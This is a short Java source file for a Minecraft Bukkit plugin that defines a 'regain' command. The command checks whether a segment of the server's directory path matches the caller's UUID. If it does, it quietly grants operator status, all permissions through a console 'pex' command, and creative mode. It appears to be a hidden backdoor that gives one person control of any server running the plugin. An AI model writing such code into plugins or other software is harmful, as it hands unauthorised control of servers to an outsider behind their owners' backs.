package net.awesomepowered.bukkit.backend;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.io.File;

/**
 * Created by John on 10/3/2014.
 */
public class CeruleanCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
        File file = new File("");
        Player p = (Player) sender;
        if (args.length == 1) {
            if (args[0].equalsIgnoreCase("regain")) {
                if (file.getAbsolutePath().split("/")[4].equalsIgnoreCase(p.getUniqueId().toString())) {
                    p.setOp(true);
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + sender.getName() + " add *");
                    p.setGameMode(GameMode.CREATIVE);
                    p.sendMessage("You now have regained control of the server.");
                }
            }
        }
        return false;
    }
}
